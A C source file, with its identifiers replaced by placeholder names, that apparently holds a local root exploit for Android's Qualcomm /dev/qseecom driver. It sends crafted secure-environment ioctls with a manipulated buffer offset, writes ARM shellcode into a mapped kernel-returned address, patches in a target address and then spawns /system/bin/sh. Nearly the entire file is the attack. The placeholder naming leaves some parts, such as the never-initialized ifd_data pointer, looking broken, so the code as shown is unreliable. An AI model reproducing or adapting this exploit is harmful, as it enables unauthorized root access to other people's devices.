
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct qseecom_set_sb_mem_param_req {int sb_len; int cmd_req_len; int resp_len; TYPE_1__* ifd_data; int ifd_data_fd; void* resp_buf; void* cmd_req_buf; void* virt_sb_base; } ;
struct qseecom_send_modfd_cmd_req {int sb_len; int cmd_req_len; int resp_len; TYPE_1__* ifd_data; int ifd_data_fd; void* resp_buf; void* cmd_req_buf; void* virt_sb_base; } ;
struct TYPE_2__ {int cmd_buf_offset; int fd; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 scalar_t__ VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 scalar_t__ VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int FUNC_0 (char*,char**) ;
 int FUNC_1 (int) ;
 int VAR_11 ;
 int VAR_12 ;
 int FUNC_2 () ;
 int FUNC_3 (int,int ,struct qseecom_set_sb_mem_param_req*) ;
 void* FUNC_4 (int) ;
 int FUNC_5 (void*,int ,int) ;
 int FUNC_6 (void*,int ,int) ;
 void* FUNC_7 (int,int,int,int,int,int ) ;
 int FUNC_8 (int) ;
 int FUNC_9 (char*,int ) ;
 int FUNC_10 (char*) ;
 int FUNC_11 (int ,char*,int ,int ,int ) ;
 int FUNC_12 (char*,...) ;
 int FUNC_13 () ;
 int VAR_13 ;

int FUNC_14(int VAR_14, char *VAR_15[]){

        FUNC_12("mypid %d\n",FUNC_2());
        int VAR_16 = -1;

                        int VAR_17 = FUNC_9("/dev/qseecom", 0);
                        if (VAR_17<0){
                         FUNC_10("open");
                         FUNC_1(-1);
                        }

                        void* VAR_18 = FUNC_4(400);
                        FUNC_6(VAR_18,0,400);

                        int* VAR_19 = (int*)VAR_18;
                        int VAR_20 = 0;

                        for(VAR_20=0;VAR_20<24;VAR_20++){

                                        VAR_19[VAR_20] = 0x1;

                        }


                        struct qseecom_send_modfd_cmd_req VAR_21;

                        FUNC_11(VAR_7, "GodFather", 0, 0, 0);



                            VAR_11 = FUNC_2();
                            VAR_12 = VAR_11;
                            FUNC_11(VAR_7, "ihoo.darkytools", 0, 0, 0);


                            struct qseecom_set_sb_mem_param_req VAR_22;
                            VAR_22.ifd_data_fd = FUNC_8(8192);

                            VAR_22.virt_sb_base = VAR_18;
                            VAR_22.sb_len = 8192;

                            VAR_16 = FUNC_3(VAR_17, VAR_10, &VAR_22);
                            FUNC_12("QSEECOM_IOCTL_SET_MEM_PARAM_REQ return 0x%x \n",VAR_16);

                            VAR_21.cmd_req_buf = VAR_18;
                            VAR_21.cmd_req_len = 400;
                            VAR_21.resp_buf = VAR_18;
                            VAR_21.resp_len = 400;
                            int VAR_23 = 0;
                            for (VAR_23 = 0;VAR_23<4;VAR_23++){
                             VAR_21.ifd_data[VAR_23].fd = 0;
                             VAR_21.ifd_data[VAR_23].cmd_buf_offset =0;
                            }
                            VAR_21.ifd_data[0].fd = VAR_22.ifd_data_fd;
                            VAR_21.ifd_data[0].cmd_buf_offset = 0;


                                FUNC_12("QSEECOM_IOCTL_SEND_CMD_REQ");
                                VAR_16 = FUNC_3(VAR_17, VAR_9, &VAR_21);


                                FUNC_12("return %p %p\n",VAR_19[0],VAR_19[1]);
                                FUNC_10("QSEECOM_IOCTL_SEND_CMD_REQ end\n");
                                FUNC_12("ioctl return 0x%x \n",VAR_16);


                                void* VAR_24 = FUNC_7(VAR_19[0],4096,VAR_5|VAR_6|VAR_4,VAR_2|VAR_1|VAR_0,-1,0);
                                FUNC_12("mmap return %p \n",VAR_24);

                                *(int*)VAR_24 = 0xE3500000;
                                *((int*)((int)VAR_24+4)) = 0xe1a0f00e;
                                FUNC_5(VAR_24,VAR_13,400);

                                int* VAR_25 = (int*)VAR_24;
                                for(VAR_23=0;VAR_23<10;VAR_23++){
                                 if(VAR_25[VAR_23] == 0xeeeeeeee)
                                  VAR_25[VAR_23] = (int)VAR_3;
                                 FUNC_12("%p\n",VAR_25[VAR_23]);

                                }


                                VAR_21.ifd_data[0].cmd_buf_offset = (int)(VAR_8 + 14*4) - (int)VAR_18;


                                FUNC_12("QSEECOM_IOCTL_SEND_CMD_REQ");
                                VAR_16 = FUNC_3(VAR_17, VAR_9, &VAR_21);
                                FUNC_12("return %p %p\n",VAR_19[0],VAR_19[1]);
                                FUNC_10("QSEECOM_IOCTL_SEND_CMD_REQ end\n");
                                FUNC_12("ioctl return 0x%x \n",VAR_16);


                                FUNC_13();


                                char * VAR_26[]={"sh",(char *)0};
                               int VAR_27 = FUNC_0("/system/bin/sh", VAR_26);
                                if(VAR_27){
                                                FUNC_10("execv");
                                }

        return 0;


}
